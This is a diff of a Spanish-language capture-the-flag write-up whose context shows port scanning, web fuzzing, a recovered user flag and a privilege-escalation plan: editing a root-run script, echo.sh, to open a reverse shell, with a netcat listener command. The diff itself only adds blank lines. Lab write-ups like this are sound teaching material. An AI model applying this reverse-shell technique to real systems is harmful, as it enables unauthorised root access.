@@ -27,6 +27,7 @@ PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
 ```
+
 - Puerto 80 y 22 Abiertos
 
 Tiramos un segundo escaneo para ver los servicios y versiones que estén corriendo.
@@ -45,6 +46,7 @@ MAC Address: AA:58:E1:5F:A8:6B (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
+
 - En el puerto 80 corre un Apache httpd 2.4.58 ((Ubuntu)) y en el 22 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
 ## Enumeración
 
@@ -69,6 +71,7 @@ Procedo a realizar fuzzing para tener un poco mas claro los recursos del servido
 /server-status        (Status: 403) [Size: 275]
 /reportes             (Status: 301) [Size: 311] [--> http://172.17.0.2/reportes/]
 ```
+
 - _scripts.js_ solo es un script para la animación de la progress-bar
 - _upload.html_ e _index.php_ son las tabs principales de la pagina
 - _upload.php_ es el script que utiliza la tab _upload.html_ para subir los archivos al servidor
@@ -138,6 +141,7 @@ No tienes permitido estar aqui :(.
 samara@ad7c505509df:~$ cat user.txt
 030208509edea7480a10b84baca3df3e
 ```
+
 - el archivo _user.txt_ al parecer es un hash de 32 caracteres por lo cual supongo que es un _MD5_  
 
 Probé romper este hash con john y con hashcat sin ningún resultado:
@@ -152,6 +156,7 @@ Entonces ahora me decidí por buscar posibles proceso que el usuario root este e
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------
 root  1  5.1  0.0   2800  1748 ? Ss 02:32   3:23 /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done
 ```
+
 - Encontramos este proceso que básicamente es un loop infinito que ejecuta a un script llamado _echo.sh_
 
 Entonces podemos tratar de modificar el script para establecernos una reverse_shell ya que eventualmente el usuario root va a ejecutar el script malicioso.
@@ -159,6 +164,7 @@ Entonces podemos tratar de modificar el script para establecernos una reverse_sh
 ```bash
 > sudo nc -nlvp 443
 ```
+
 - Modificamos el script
 ```bash
 > nano /usr/local/bin/echo.sh
